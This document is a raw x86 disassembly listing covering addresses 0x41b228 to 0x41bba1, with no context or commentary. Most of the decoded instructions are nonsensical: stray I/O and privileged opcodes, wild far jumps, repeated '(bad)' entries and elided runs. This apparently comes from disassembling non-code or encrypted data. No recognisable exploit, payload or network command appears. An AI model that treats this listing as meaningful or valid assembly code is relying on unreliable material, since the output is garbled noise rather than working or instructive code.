  41b228:	add    DWORD PTR [eax],eax
  41b22a:	pop    es
  41b22b:	add    DWORD PTR [eax],eax
  41b22d:	add    BYTE PTR [edi],dl
  41b22f:	lds    esi,FWORD PTR [ebx-0x3]
  41b232:	push   es
  41b233:	xor    BYTE PTR [edi-0x66],0x71
  41b237:	dec    ebp
  41b238:	mov    ebx,0x11cd5706
  41b23d:	sbb    edi,DWORD PTR [ebx+ebp*1+0x3a95cbc3]
  41b244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b245:	aaa    
  41b246:	ret    
  41b247:	inc    edx
  41b248:	icebp  
  41b249:	hlt    
  41b24a:	mov    esp,0x5aecd2f3
  41b24f:	int3   
  41b250:	ja     0x41b1f4
  41b252:	adc    dh,BYTE PTR [ebx]
  41b254:	sbb    DWORD PTR [edx+0x10],0x7c
  41b258:	dec    ebx
  41b259:	ret    
  41b25a:	jno    0x41b207
  41b25c:	pop    eax
  41b25d:	out    0x3c,eax
  41b25f:	mov    ecx,0xcd41c0a9
  41b264:	lock mov ds:0x73094b92,eax
  41b26a:	div    DWORD PTR [edi-0x3c1fb0e1]
  41b270:	push   es
  41b271:	pop    es
  41b272:	pop    edx
  41b273:	and    ebx,DWORD PTR [ecx+0x65]
  41b276:	sbb    DWORD PTR [ecx],edx
  41b278:	cmc    
  41b279:	pop    esp
  41b27a:	add    DWORD PTR [edi+0x43a5355d],0xffffff89
  41b281:	jo     0x41b259
  41b283:	or     esi,DWORD PTR [ebx+0x3a]
  41b286:	push   ecx
  41b287:	add    cl,0xc2
  41b28a:	fstp   st(1)
  41b28c:	std    
  41b28d:	push   es
  41b28e:	sahf   
  41b28f:	jne    0x41b301
  41b291:	lock jle 0x41b2f5
  41b294:	and    DWORD PTR [eax+0x6d],esp
  41b297:	pop    edi
  41b298:	ds ss aad 0x1a
  41b29c:	add    ch,BYTE PTR [ecx+0x1b]
  41b29f:	pushf  
  41b2a0:	in     al,dx
  41b2a1:	int    0x47
  41b2a3:	retf   
  41b2a4:	cmp    edx,DWORD PTR [ebp-0x6b]
  41b2a7:	les    esp,FWORD PTR [ecx+eax*1+0x1b]
  41b2ab:	ror    BYTE PTR [esi-0x2af4571b],cl
  41b2b1:	cld    
  41b2b2:	or     BYTE PTR [esi],dl
  41b2b4:	ret    0x887f
  41b2b7:	jae    0x41b2a2
  41b2b9:	scas   eax,DWORD PTR es:[edi]
  41b2ba:	ret    
  41b2bb:	inc    ecx
  41b2bc:	shl    BYTE PTR [ecx-0x5a0f67b5],0x92
  41b2c3:	xor    eax,0x922c2d0
  41b2c8:	clc    
  41b2c9:	mov    ds,WORD PTR [ebx+0x1b]
  41b2cc:	add    BYTE PTR [edi],0x26
  41b2cf:	mov    eax,0x84809e74
  41b2d4:	add    eax,DWORD PTR [edx-0x5f]
  41b2d7:	lahf   
  41b2d8:	outs   dx,BYTE PTR ds:[esi]
  41b2d9:	jmp    0x41b2c1
  41b2db:	push   ebp
  41b2dc:	not    BYTE PTR [ebx+0x10d0279]
  41b2e2:	push   0xf205f7c4
  41b2e7:	fistp  WORD PTR [ebp-0x34f533e1]
  41b2ed:	mov    bl,0xa0
  41b2ef:	sub    DWORD PTR [esi-0x66],esp
  41b2f2:	repz and esp,DWORD PTR [ecx]
  41b2f5:	rsm    
  41b2f7:	push   ds
  41b2f8:	sti    
  41b2f9:	into   
  41b2fa:	aam    0xc5
  41b2fc:	pushf  
  41b2fd:	add    BYTE PTR [ebx+0x6bd3a33c],al
  41b303:	cli    
  41b304:	cmp    dl,BYTE PTR [edx+0x6069b975]
  41b30a:	fcmovb st,st(4)
  41b30c:	adc    bl,0x2
  41b30f:	nop
  41b310:	cmp    cl,BYTE PTR [edi]
  41b312:	and    DWORD PTR [edi+0x17eccb19],0xe168855f
  41b31c:	add    ah,BYTE PTR [eax]
  41b31e:	mov    bl,bh
  41b320:	mov    edx,0x435f5423
  41b325:	or     eax,DWORD PTR [esi]
  41b327:	arpl   WORD PTR [edi],bp
  41b329:	outs   dx,BYTE PTR ds:[esi]
  41b32a:	out    dx,al
  41b32b:	jg     0x41b345
  41b32d:	xchg   ebx,eax
  41b32e:	push   0xc322d17a
  41b333:	inc    esp
  41b334:	in     al,0x0
	...
  41b396:	dec    eax
  41b397:	or     eax,0xbb5dab1d
  41b39c:	(bad)  
  41b39d:	out    dx,eax
  41b39e:	cld    
  41b39f:	(bad)  
  41b3a0:	mov    ?,eax
  41b3a2:	and    DWORD PTR [ebx+0x1d],0x11f0f8f
  41b3a9:	add    BYTE PTR [edi],al
  41b3ab:	add    DWORD PTR [eax],eax
  41b3ad:	add    BYTE PTR [edx],ah
  41b3af:	or     bl,bh
  41b3b1:	add    DWORD PTR [eax+esi*4-0x85a86c7],0x75
  41b3b9:	push   esi
  41b3ba:	loope  0x41b36d
  41b3bc:	jp     0x41b348
  41b3be:	add    DWORD PTR [esi+0x53],esp
  41b3c1:	(bad)  
  41b3c2:	ins    BYTE PTR es:[edi],dx
  41b3c3:	jnp    0x41b384
  41b3c5:	not    DWORD PTR [ebx+eiz*1+0x196680ed]
  41b3cc:	xchg   ebp,eax
  41b3cd:	call   0x233c1acf
  41b3d2:	sbb    eax,0x665232d5
  41b3d7:	imul   eax,DWORD PTR [edi],0xffffffab
  41b3da:	scas   al,BYTE PTR es:[edi]
  41b3db:	cmp    bh,cl
  41b3dd:	fnstenv [esi-0x2e1e1df]
  41b3e3:	pop    esp
  41b3e4:	ds pusha 
  41b3e6:	mov    al,0xc5
  41b3e8:	sti    
  41b3e9:	out    dx,al
  41b3ea:	in     al,0x91
  41b3ec:	sbb    DWORD PTR [edx-0x3dda8670],0xc
  41b3f3:	sbb    al,0xb4
  41b3f5:	outs   dx,DWORD PTR ds:[esi]
  41b3f6:	adc    DWORD PTR [edx],edi
  41b3f8:	xchg   ebx,eax
  41b3f9:	xchg   ecx,eax
  41b3fa:	or     DWORD PTR [edi-0x514fe6c8],ebp
  41b400:	or     esi,DWORD PTR [eax+0x2d802f88]
  41b406:	mov    edx,0x5011831a
  41b40b:	fsubr  st(7),st
  41b40e:	push   esp
  41b40f:	adc    eax,0xbef36d5e
  41b414:	dec    ebx
  41b415:	aaa    
  41b416:	push   ecx
  41b417:	ret    
  41b418:	xor    dl,ah
  41b41a:	dec    esi
  41b41b:	mov    ds:0x1f988e18,al
  41b420:	ins    DWORD PTR es:[edi],dx
  41b421:	test   al,0x8c
  41b423:	mov    esp,0xe0e8d1d0
  41b428:	enter  0x1e0d,0x74
  41b42c:	outs   dx,DWORD PTR es:[esi]
  41b42e:	retf   0x83a5
  41b431:	jnp    0x41b463
  41b433:	sub    al,0x87
  41b435:	lods   eax,DWORD PTR ds:[esi]
  41b436:	fimul  WORD PTR [ebx+ebx*8]
  41b439:	loope  0x41b478
  41b43b:	lock dec edi
  41b43d:	popf   
  41b43e:	cmp    esp,DWORD PTR [bp-0x2b]
  41b442:	into   
  41b443:	clc    
  41b444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b445:	mov    dl,0x2d
  41b447:	loope  0x41b401
  41b449:	or     DWORD PTR [esi+0x11],esi
  41b44c:	sub    bh,BYTE PTR [edi+edx*8-0x3ea9931d]
  41b453:	dec    eax
  41b454:	sbb    dh,bl
  41b456:	pop    ebp
  41b457:	stc    
  41b458:	push   ecx
  41b459:	fcomp  QWORD PTR [esi-0x42]
  41b45c:	scas   eax,DWORD PTR es:[edi]
  41b45d:	jg     0x41b4ce
  41b45f:	fcom   DWORD PTR [ecx-0xf]
  41b462:	ins    BYTE PTR es:[edi],dx
  41b463:	jbe    0x41b452
  41b465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b466:	add    BYTE PTR [ecx-0x77],dl
  41b469:	mov    edx,0x3820cf1b
  41b46e:	(bad)  
  41b46f:	sti    
  41b470:	repz fwait
  41b472:	jl     0x41b48c
  41b474:	mov    bh,0xda
  41b476:	pop    es
  41b477:	dec    esp
  41b478:	push   esi
  41b479:	lods   eax,DWORD PTR ds:[esi]
  41b47a:	push   ss
  41b47b:	idiv   cl
  41b47d:	fsubr  DWORD PTR [edx+esi*2]
  41b480:	and    DWORD PTR [esi],0x381b5a82
  41b486:	jne    0x41b41c
  41b488:	and    BYTE PTR [eax+ebx*8+0x40c5bc3],cl
  41b48f:	add    eax,0xbdd60362
  41b494:	xor    ebp,DWORD PTR [esp+edx*8+0x6dbeb2aa]
  41b49b:	int3   
  41b49c:	cld    
  41b49d:	pop    edi
  41b49e:	out    dx,al
  41b49f:	outs   dx,BYTE PTR ds:[esi]
  41b4a0:	stos   DWORD PTR es:[edi],eax
  41b4a1:	xor    al,0x3b
  41b4a3:	test   DWORD PTR [ebx-0x4c],edx
  41b4a6:	popa   
  41b4a7:	mov    eax,0x5c75169b
  41b4ac:	push   0x1a
  41b4ae:	sti    
  41b4af:	bound  edx,QWORD PTR [esi+esi*4+0x3e]
  41b4b3:	mov    esi,DWORD PTR [edi+0x0]
	...
  41b516:	aam    0xec
  41b518:	add    edi,edi
  41b51a:	cmp    edi,edi
  41b51c:	(bad)  
  41b51d:	out    dx,eax
  41b51e:	lock add DWORD PTR [ebp-0x3c],ebp
  41b522:	dec    ebp
  41b523:	int3   
  41b524:	jp     0x41b4ca
  41b526:	push   ss
  41b527:	and    BYTE PTR [ecx],al
  41b529:	add    BYTE PTR [edi],al
  41b52b:	add    DWORD PTR [eax],eax
  41b52d:	add    BYTE PTR [ebx],al
  41b52f:	pusha  
  41b530:	mov    ds:0x956ddb17,eax
  41b535:	int3   
  41b536:	popf   
  41b537:	in     eax,dx
  41b538:	sahf   
  41b539:	bsr    ecx,DWORD PTR [eax-0x44]
  41b53d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b53e:	adc    dh,BYTE PTR [si]
  41b541:	add    dl,bh
  41b543:	test   BYTE PTR [ecx+ebx*2],al
  41b546:	ins    BYTE PTR es:[edi],dx
  41b547:	div    BYTE PTR ds:0xaf2f666a
  41b54d:	xor    BYTE PTR [ebx-0x4537841e],cl
  41b553:	sar    BYTE PTR [edx+0x3d],0x67
  41b557:	jbe    0x41b54b
  41b559:	inc    edx
  41b55a:	sub    edi,ebx
  41b55c:	jne    0x41b559
  41b55e:	push   edi
  41b55f:	nop
  41b560:	dec    ecx
  41b561:	mov    edx,0xeb4c4412
  41b566:	(bad)  
  41b567:	dec    ebp
  41b568:	loop   0x41b53a
  41b56a:	pop    esp
  41b56b:	xor    eax,DWORD PTR [ecx-0x7d]
  41b56e:	sahf   
  41b56f:	mov    eax,ds:0x95535e75
  41b574:	fmulp  st(1),st
  41b576:	dec    edx
  41b577:	push   ss
  41b578:	repnz xor DWORD PTR [ecx-0x52f3dfcd],0xcadb5e39
  41b583:	mov    ch,0xba
  41b585:	popa   
  41b586:	xchg   ebx,eax
  41b587:	add    eax,0xe2a3e257
  41b58c:	scas   al,BYTE PTR es:[edi]
  41b58d:	jae    0x41b51b
  41b58f:	dec    edi
  41b590:	sub    DWORD PTR [edx+0x65570a58],esi
  41b596:	fdivr  DWORD PTR [eax+eiz*2]
  41b599:	adc    BYTE PTR [ecx+ebp*2+0x6c],0x1c
  41b59e:	xor    BYTE PTR [ecx],0x13
  41b5a1:	mov    esp,0x3b2ff210
  41b5a6:	dec    ecx
  41b5a7:	add    BYTE PTR ds:0x7c6eddd6,dh
  41b5ad:	xor    ebp,DWORD PTR [edi+0x11]
  41b5b0:	push   ecx
  41b5b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5b2:	dec    esi
  41b5b3:	push   es
  41b5b4:	repnz push esp
  41b5b6:	mov    ebp,0x6b92be61
  41b5bb:	push   ss
  41b5bc:	into   
  41b5bd:	cmp    esp,esp
  41b5bf:	add    dl,0xea
  41b5c2:	pusha  
  41b5c3:	add    eax,0xb48613b6
  41b5c8:	jb     0x41b624
  41b5ca:	outs   dx,DWORD PTR ds:[esi]
  41b5cb:	inc    eax
  41b5cc:	dec    ecx
  41b5cd:	pop    ds
  41b5ce:	enter  0xd6c4,0x7c
  41b5d2:	out    dx,al
  41b5d3:	(bad)  
  41b5d5:	add    BYTE PTR [ecx-0x7639ca9c],ch
  41b5db:	out    0x34,al
  41b5dd:	jge    0x41b5c7
  41b5df:	test   eax,0x5eba2d9b
  41b5e4:	loope  0x41b57e
  41b5e6:	push   ebp
  41b5e7:	std    
  41b5e8:	in     al,dx
  41b5e9:	mov    ch,BYTE PTR [eax-0x8]
  41b5ec:	jns    0x41b5e3
  41b5ee:	jp     0x41b5da
  41b5f0:	xor    edx,DWORD PTR [ecx+eax*1+0x41f40bb4]
  41b5f7:	push   edx
  41b5f8:	cmp    ecx,eax
  41b5fa:	mov    eax,DWORD PTR [ebx+0x34]
  41b5fd:	aas    
  41b5fe:	jns    0x41b617
  41b600:	out    0x47,eax
  41b602:	bound  ebx,QWORD PTR [esi-0x60da4934]
  41b608:	test   eax,0xdc936166
  41b60d:	adc    DWORD PTR ds:0x54957645,ebp
  41b613:	mov    DWORD PTR [edi],esi
  41b615:	jns    0x41b62d
  41b617:	fldenv [ecx+0x2a]
  41b61a:	mov    edi,0xba1bb910
  41b61f:	call   0xbe56:0x5fad1010
  41b626:	mov    DWORD PTR [edi],esi
  41b628:	stos   DWORD PTR es:[edi],eax
  41b629:	xchg   ecx,eax
  41b62a:	dec    esp
  41b62b:	pop    edx
  41b62c:	fbld   TBYTE PTR [ecx+0x58]
  41b62f:	inc    esp
  41b630:	hlt    
  41b631:	(bad)  
  41b632:	daa    
  41b633:	xor    eax,0x9c
	...
  41b694:	add    BYTE PTR [eax],al
  41b696:	test   al,0x63
  41b698:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b69e:	cmp    al,0x28
  41b6a0:	rol    BYTE PTR [eax],1
  41b6a2:	jno    0x41b67c
  41b6a4:	aas    
  41b6a5:	outs   dx,DWORD PTR ds:[esi]
  41b6a6:	sbb    eax,0x7000121
  41b6ab:	add    DWORD PTR [eax],eax
  41b6ad:	add    BYTE PTR [edi],al
  41b6af:	popa   
  41b6b0:	icebp  
  41b6b1:	ss pop edx
  41b6b3:	lea    esi,[edi]
  41b6b5:	fisubr WORD PTR [esi+0x6acc81df]
  41b6bb:	lock mov esi,0x63108f2b
  41b6c1:	cmp    ecx,eax
  41b6c3:	jge    0x41b682
  41b6c5:	arpl   WORD PTR [ecx-0x38624bab],si
  41b6cb:	pop    edi
  41b6cc:	ja     0x41b65e
  41b6ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6cf:	pop    es
  41b6d0:	fwait
  41b6d1:	ret    
  41b6d2:	inc    esp
  41b6d3:	mov    cl,0x30
  41b6d5:	aas    
  41b6d6:	(bad)
  41b6d9:	outs   dx,BYTE PTR ds:[esi]
  41b6da:	cld    
  41b6db:	int    0xd8
  41b6dd:	cmp    al,0x87
  41b6df:	cdq    
  41b6e0:	sub    al,0x2d
  41b6e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6e3:	fcmovne st,st(0)
  41b6e5:	fcomp  DWORD PTR [ebp-0x55]
  41b6e8:	pusha  
  41b6e9:	pop    eax
  41b6ea:	in     eax,0x8f
  41b6ec:	adc    edx,edx
  41b6ee:	push   0xffffffe6
  41b6f0:	sbb    al,ah
  41b6f2:	out    0x5e,eax
  41b6f4:	cmp    esi,ebp
  41b6f6:	pop    edi
  41b6f7:	ja     0x41b6a1
  41b6f9:	daa    
  41b6fa:	dec    esp
  41b6fb:	mov    al,ds:0x4e5bc5a5
  41b700:	mov    ecx,0x8268cef7
  41b705:	lods   al,BYTE PTR ds:[esi]
  41b706:	push   ebx
  41b707:	pop    ss
  41b708:	xchg   esp,eax
  41b709:	test   DWORD PTR [eax-0x4f],edx
  41b70c:	xlat   BYTE PTR ds:[ebx]
  41b70d:	or     DWORD PTR [esi-0x39],esp
  41b710:	pushf  
  41b711:	(bad)  [edi]
  41b713:	retf   
  41b714:	xchg   esp,eax
  41b715:	xor    esi,DWORD PTR [edx-0x83b9b5d]
  41b71b:	lahf   
  41b71c:	jae    0x41b6aa
  41b71e:	inc    esp
  41b71f:	sbb    ch,BYTE PTR [ebx-0x48]
  41b722:	(bad)  
  41b723:	pop    esp
  41b724:	fsubr  st(4),st
  41b726:	retf   
  41b727:	test   eax,0xd7ee6552
  41b72c:	sbb    DWORD PTR [edx-0x4c],ecx
  41b72f:	mov    edi,0x88bee168
  41b734:	xor    DWORD PTR [esi],0x6b
  41b737:	mov    edx,0x6e9a2928
  41b73c:	jne    0x41b6f2
  41b73e:	sbb    BYTE PTR [edx-0x3b],0xcf
  41b742:	sahf   
  41b743:	test   DWORD PTR [ebp+0x4f0b1204],esi
  41b749:	and    eax,DWORD PTR [eax-0x44a2dd70]
  41b74f:	and    BYTE PTR [eax-0x43],0x77
  41b753:	mul    DWORD PTR [esi-0x5a0b3980]
  41b759:	lock mov edi,0xde1b0659
  41b75f:	mov    eax,0x735ccd96
  41b764:	clc    
  41b765:	or     DWORD PTR [edx],eax
  41b767:	add    BYTE PTR [edx+eax*8],ch
  41b76a:	mov    ah,0xc2
  41b76c:	scas   al,BYTE PTR es:[edi]
  41b76d:	sub    WORD PTR [edi+0x59eb88b1],0x9acf
  41b776:	pop    ebp
  41b777:	psraw  mm6,QWORD PTR [ebx+0x344bbe66]
  41b77e:	arpl   WORD PTR [ecx+edx*4-0x118e96cc],bp
  41b785:	push   eax
  41b786:	lods   al,BYTE PTR ds:[esi]
  41b787:	stc    
  41b788:	les    ecx,FWORD PTR [edi+0x57]
  41b78b:	test   DWORD PTR [esi+ebx*2],0x6cad207e
  41b792:	lock jmp 0x41b731
  41b795:	sbb    BYTE PTR [ebp+ebp*8+0x74823d5b],dh
  41b79c:	repnz inc eax
  41b79e:	ret    
  41b79f:	mov    al,0xc3
  41b7a1:	pop    edi
  41b7a2:	sub    eax,0xaf77b9b8
  41b7a7:	inc    ebp
  41b7a8:	scas   al,BYTE PTR es:[di]
  41b7aa:	jne    0x41b741
  41b7ac:	pop    ebx
  41b7ad:	rcl    DWORD PTR [ebx+0xc420f43],0x3f
  41b7b4:	fild   DWORD PTR [eax]
	...
  41b816:	mov    bh,ah
  41b818:	(bad)  
  41b819:	dec    esi
  41b81a:	idiv   DWORD PTR [edi-0x75]
  41b81d:	cld    
  41b81e:	fcmovbe st,st(0)
  41b820:	(bad)  
  41b821:	out    0xd1,al
  41b823:	enter  0x9ef4,0x24
  41b827:	and    al,BYTE PTR [ecx]
  41b829:	add    BYTE PTR [edi],al
  41b82b:	add    DWORD PTR [eax],eax
  41b82d:	add    BYTE PTR ds:0xd98ce752,al
  41b833:	fwait
  41b834:	add    ebx,eax
  41b836:	mov    DWORD PTR [edx],ecx
  41b838:	fist   WORD PTR [edi+0x4f]
  41b83b:	xchg   esi,eax
  41b83c:	jle    0x41b7ff
  41b83e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b83f:	mov    bh,BYTE PTR [esp+ebp*4-0x21]
  41b843:	ins    DWORD PTR es:[edi],dx
  41b844:	dec    ebp
  41b845:	jp     0x41b834
  41b847:	jmp    DWORD PTR [ecx]
  41b849:	mov    ecx,0xa27f03d7
  41b84e:	sub    ah,bh
  41b850:	pop    es
  41b851:	dec    edx
  41b852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b853:	xor    BYTE PTR [ecx-0x3717e70],ch
  41b859:	jmp    0xca6fad7f
  41b85e:	dec    ebp
  41b85f:	jns    0x41b88f
  41b861:	jge    0x41b835
  41b863:	jne    0x41b8a1
  41b865:	push   ebx
  41b866:	xchg   ebx,eax
  41b867:	sub    eax,0x22639ca2
  41b86c:	sbb    BYTE PTR [ecx+0x5c61e959],dh
  41b872:	or     ah,BYTE PTR [eax+eiz*8]
  41b875:	jbe    0x41b82a
  41b877:	jmp    0x8f8b:0x9e898b73
  41b87e:	add    BYTE PTR [ebx+0x175303bd],bl
  41b884:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b885:	nop    DWORD PTR [bp+si]
  41b889:	mov    esp,0xe9ce9986
  41b88e:	shl    BYTE PTR [ecx-0x60f435cd],cl
  41b894:	into   
  41b895:	rol    bh,0x8
  41b898:	adc    eax,0x15b52f55
  41b89d:	in     eax,0xae
  41b89f:	nop
  41b8a0:	cmc    
  41b8a1:	leave  
  41b8a2:	sbb    edi,DWORD PTR [edx]
  41b8a4:	xchg   ebx,eax
  41b8a5:	cmp    eax,0x6c652698
  41b8aa:	mov    BYTE PTR [esi-0x76b06a81],ch
  41b8b0:	xor    edx,ecx
  41b8b2:	cmp    BYTE PTR [ebx+0x15],al
  41b8b5:	dec    ebx
  41b8b6:	mov    ah,0x38
  41b8b8:	cld    
  41b8b9:	adc    edx,DWORD PTR [edx+esi*1]
  41b8bc:	mov    al,ds:0x3ed73552
  41b8c1:	arpl   bp,bp
  41b8c3:	(bad)  
  41b8c4:	loopne 0x41b929
  41b8c6:	cmp    cl,dl
  41b8c8:	mov    DWORD PTR [edx*2+0x7a7106de],esp
  41b8cf:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8d1:	jno    0x41b914
  41b8d3:	mov    cl,0xf2
  41b8d5:	iret   
  41b8d6:	mov    ebx,0x1db6e920
  41b8db:	mov    eax,ds:0xcaecfc5
  41b8e0:	test   esp,esi
  41b8e2:	cmp    dl,BYTE PTR [ebp-0x1e]
  41b8e5:	in     eax,dx
  41b8e6:	aam    0x68
  41b8e8:	test   eax,0x628e4af7
  41b8ed:	div    BYTE PTR [ecx+0x437e6a1f]
  41b8f3:	stos   BYTE PTR es:[edi],al
  41b8f4:	data16 sbb al,0x4e
  41b8f7:	dec    ebx
  41b8f8:	pushf  
  41b8f9:	(bad)  
  41b8fa:	leave  
  41b8fb:	mov    eax,0xa0c6ceae
  41b900:	hlt    
  41b901:	test   eax,0xe1b920cd
  41b906:	nop
  41b907:	jns    0x41b926
  41b909:	je     0x41b8bd
  41b90b:	pop    edx
  41b90c:	sbb    BYTE PTR [ebp+0x20e65c6b],bl
  41b912:	pushf  
  41b913:	psrlw  mm3,QWORD PTR [ebp-0xb]
  41b917:	push   0xffffff97
  41b919:	dec    eax
  41b91a:	cmp    al,0x8a
  41b91c:	push   0x53
  41b91e:	imul   esp,DWORD PTR [ecx],0xffffffff
  41b921:	adc    bl,cl
  41b923:	add    BYTE PTR [edx+0x436d685e],bl
  41b929:	ficomp WORD PTR [ebp-0x5d]
  41b92c:	pop    esp
  41b92d:	sbb    DWORD PTR [edx+eiz*8],esp
  41b930:	jge    0x41b8d4
  41b932:	test   ah,0x80
	...
  41b995:	add    bl,al
  41b997:	mov    esp,0xf87f4844
  41b99c:	iret   
  41b99d:	mov    edi,0x51d578ae
  41b9a2:	adc    eax,DWORD PTR [edi]
  41b9a4:	pop    ebp
  41b9a5:	mov    ds:0x1232b,al
  41b9aa:	pop    es
  41b9ab:	add    DWORD PTR [eax],eax
  41b9ad:	add    BYTE PTR [edx-0xf],dh
  41b9b0:	cmp    ch,BYTE PTR [edx]
  41b9b2:	mov    ebx,0x816acba9
  41b9b7:	fldenv [edi-0x20]
  41b9ba:	xchg   ecx,eax
  41b9bb:	jo     0x41ba2d
  41b9bd:	push   eax
  41b9be:	and    edx,ebx
  41b9c0:	jne    0x41ba2f
  41b9c2:	ficom  WORD PTR [esp+ebp*2-0xde2a323]
  41b9c9:	sub    eax,0xfb70778b
  41b9ce:	or     dh,BYTE PTR [edi+0x3e3225eb]
  41b9d4:	fnsave [eax-0x57905a40]
  41b9da:	mov    edi,0x41f93f6e
  41b9df:	pop    edx
  41b9e0:	mov    dl,0xfe
  41b9e2:	adc    bh,dl
  41b9e4:	sbb    BYTE PTR [ecx+ebx*1+0x61cc24e8],dh
  41b9eb:	into   
  41b9ec:	sbb    ecx,DWORD PTR [eax-0x476a1b0c]
  41b9f2:	test   edi,0xe469cffb
  41b9f8:	jb     0x41b984
  41b9fa:	lahf   
  41b9fb:	cwde   
  41b9fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9fd:	aaa    
  41b9fe:	inc    edx
  41b9ff:	sbb    ebp,0x88f7fe37
  41ba05:	out    0xfd,al
  41ba07:	dec    edx
  41ba08:	cmp    ecx,DWORD PTR [eax+0x50d2fc66]
  41ba0e:	xchg   BYTE PTR [ebx],bh
  41ba10:	jnp    0x41ba39
  41ba12:	(bad)  
  41ba13:	int3   
  41ba14:	and    DWORD PTR [esi-0x5e26ff9e],eax
  41ba1a:	cmp    DWORD PTR [esp+ebx*4],ecx
  41ba1d:	inc    edi
  41ba1e:	test   BYTE PTR cs:[esp+0x6f],0x2a
  41ba24:	mov    cl,BYTE PTR [eax-0x2f]
  41ba27:	test   BYTE PTR [eax],cl
  41ba29:	push   esi
  41ba2a:	pusha  
  41ba2b:	(bad)  
  41ba2c:	in     eax,dx
  41ba2d:	pushf  
  41ba2e:	xchg   BYTE PTR [edi+0x68703cba],dh
  41ba34:	cdq    
  41ba35:	add    al,0xbd
  41ba37:	push   0xffffff93
  41ba39:	jbe    0x41ba55
  41ba3b:	xchg   DWORD PTR [eax-0x36473720],eax
  41ba41:	inc    edx
  41ba42:	push   esi
  41ba43:	pusha  
  41ba44:	or     bh,BYTE PTR [eax+0x1d]
  41ba47:	and    dh,dh
  41ba49:	dec    esp
  41ba4a:	scas   al,BYTE PTR es:[edi]
  41ba4b:	into   
  41ba4c:	add    esp,ebp
  41ba4e:	dec    edi
  41ba4f:	lock jo 0x41babe
  41ba52:	and    DWORD PTR [ebx-0x210c1fee],0x43
  41ba59:	jmp    0x41b9fc
  41ba5b:	inc    ecx
  41ba5c:	stos   BYTE PTR es:[edi],al
  41ba5d:	push   ebx
  41ba5e:	sbb    ebp,ebx
  41ba60:	xor    eax,0x1cfe4840
  41ba65:	mov    ebp,0xa1e7d298
  41ba6a:	inc    edi
  41ba6b:	repz pop eax
  41ba6d:	mov    bl,0x95
  41ba6f:	dec    ecx
  41ba70:	loope  0x41ba78
  41ba72:	in     eax,0xb1
  41ba74:	ror    ebx,0x3d
  41ba77:	js     0x41baef
  41ba79:	dec    esp
  41ba7a:	cmc    
  41ba7b:	adc    cl,bl
  41ba7d:	xor    ecx,DWORD PTR [edx]
  41ba7f:	cmp    DWORD PTR [eax-0x59],esi
  41ba82:	(bad)  
  41ba83:	dec    ebx
  41ba84:	pop    ss
  41ba85:	and    eax,0xfaebdc18
  41ba8a:	jae    0x41ba50
  41ba8c:	enter  0x85fc,0xdd
  41ba90:	mov    ah,0xc2
  41ba92:	jmp    0x41baef
  41ba94:	por    mm7,mm2
  41ba97:	or     BYTE PTR [eax-0x13],dh
  41ba9a:	test   DWORD PTR [ebp+0x4a852739],esp
  41baa0:	icebp  
  41baa1:	cmp    al,0x36
  41baa3:	adc    edx,esp
  41baa5:	dec    esi
  41baa6:	scas   eax,DWORD PTR es:[edi]
  41baa7:	xchg   ecx,eax
  41baa8:	(bad)  
  41baa9:	sbb    ebp,DWORD PTR [ebp-0x4322dc04]
  41baaf:	mov    edx,DWORD PTR [edx+0x41]
  41bab2:	stos   DWORD PTR es:[edi],eax
  41bab3:	clc    
  41bab4:	and    eax,0x0
	...
  41bb15:	add    BYTE PTR [edx],cl
  41bb17:	mov    eax,0xbfb7aaa5
  41bb1c:	(bad)  
  41bb1e:	lahf   
  41bb1f:	and    esp,DWORD PTR [ebx-0x56]
  41bb22:	cmp    DWORD PTR [edi+0x2c],ebp
  41bb25:	data16 xor ah,BYTE PTR [ecx+eax*1]
  41bb29:	add    BYTE PTR [edi],al
  41bb2b:	add    DWORD PTR [eax],eax
  41bb2d:	add    BYTE PTR [ecx],bl
  41bb2f:	repz mov ecx,0x1c8cc9c0
  41bb35:	mov    cl,0x40
  41bb37:	test   esp,esp
  41bb39:	fcomp  QWORD PTR [edi]
  41bb3b:	sbb    eax,0xe3880c26
  41bb40:	jmp    0x41bb99
  41bb42:	mov    dl,0x83
  41bb44:	sub    dl,BYTE PTR [eax+0x72]
  41bb47:	daa    
  41bb48:	sahf   
  41bb49:	lods   al,BYTE PTR ds:[esi]
  41bb4a:	ficom  DWORD PTR [edx]
  41bb4c:	cmp    DWORD PTR [esi+0x33],ebx
  41bb4f:	mov    WORD PTR [ebp-0x23],cs
  41bb52:	sahf   
  41bb53:	(bad)  
  41bb54:	fnstcw WORD PTR [edi-0x1adfde4f]
  41bb5a:	pusha  
  41bb5b:	dec    esi
  41bb5c:	dec    esi
  41bb5d:	sbb    al,0x7b
  41bb5f:	and    BYTE PTR ds:0xfe35d870,dl
  41bb65:	iret   
  41bb66:	jmp    0x5a4:0xdccd53c7
  41bb6d:	pop    esp
  41bb6e:	repz and ah,bl
  41bb71:	inc    ebp
  41bb72:	dec    edx
  41bb73:	mov    ch,0x10
  41bb75:	or     DWORD PTR [edi],edi
  41bb77:	inc    eax
  41bb78:	pop    edi
  41bb79:	je     0x41bb9b
  41bb7b:	pop    DWORD PTR [ebx]
  41bb7d:	cli    
  41bb7e:	dec    edx
  41bb7f:	jnp    0x41bbef
  41bb81:	ja     0x41bb52
  41bb83:	fdivp  st(0),st
  41bb85:	fnstenv [edi]
  41bb87:	xchg   edi,eax
  41bb88:	aas    
  41bb89:	nop
  41bb8a:	popa   
  41bb8b:	adc    al,0xea
  41bb8d:	retf   
  41bb8e:	aas    
  41bb8f:	sti    
  41bb90:	mov    ds:0x8e6a9802,al
  41bb95:	(bad)  
  41bb96:	cld    
  41bb97:	aas    
  41bb98:	pop    ecx
  41bb99:	or     esp,ecx
  41bb9b:	test   eax,0xfa5f3790
  41bba0:	ins    DWORD PTR es:[edi],dx
  41bba1:	outs   dx,BYTE PTR ds:[esi]
